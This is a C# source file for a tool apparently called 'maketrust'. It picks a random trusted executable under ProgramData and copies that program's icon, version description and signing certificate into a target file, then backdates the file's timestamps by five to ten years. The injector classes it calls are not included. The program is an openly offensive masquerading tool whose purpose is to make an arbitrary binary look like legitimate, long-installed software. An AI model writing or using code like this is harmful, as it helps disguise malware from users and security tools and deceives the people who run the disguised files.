using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace maketrust
{
    class Program
    {
        static Random random = new Random(Guid.NewGuid().GetHashCode());
        static void Main(string[] args)
        {
            string file = args[0];
            string randomprogram = GetRandomTrustedProgram();
            Console.WriteLine("Stealing from {0}", randomprogram);
            CopyIcon(randomprogram, file);
            CopyInfo(randomprogram, file);
            CopyCertificate(randomprogram, file);
            SetTime(file);

            Console.WriteLine("Done");
            Console.ReadLine();

        }
        static void CopyIcon(string from, string to)
        {
            IconInjector.Inject(from, to);
        }

        static void CopyCertificate(string from, string to)
        {
            CertificateInjector.Inject(from, to);
        }

        static void CopyInfo (string from, string to)
        {
            DescriptionInjector.Inject(from, to);
        }

        static void SetTime(string file )
        {
            File.SetCreationTime(file, DateTime.Now.AddYears(Rand(-10,-5)));
            File.SetLastAccessTime(file, DateTime.Now.AddYears(Rand(-10, -5)));
            File.SetLastWriteTime(file, DateTime.Now.AddYears(Rand(-10, -5)));
        }

        static int Rand(int min, int max)
        {
            return random.Next(min, max);
        }

        static string GetRandomTrustedProgram()
        {
            string programsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);//"%programfiles%".NormalizePath();
                                                                                                             // string[] programs = Directory.GetFiles(programsPath, "*.exe", SearchOption.AllDirectories);
            string[] programs = GetFileList(programsPath, "*.exe", true);
            Console.WriteLine("Total files: {0}", programs.Length);
            foreach(var p in programs )
            Console.WriteLine(p);
            return programs[Rand(0, programs.Length)];

        }

        static string [] GetFileList(string dir, string pattern, bool recursive)
        {
            using (Process p = new Process())
            {
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments += "/C \"dir /b";
                if (recursive) 
                    p.StartInfo.Arguments += " /S";
                if (!string.IsNullOrEmpty(pattern))
                    p.StartInfo.Arguments += " " + pattern ;
                p.StartInfo.Arguments += "\"";
                p.StartInfo.WorkingDirectory = dir;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return output.Split(new[] { Environment.NewLine } , StringSplitOptions.RemoveEmptyEntries);
            }

        }
    }
}
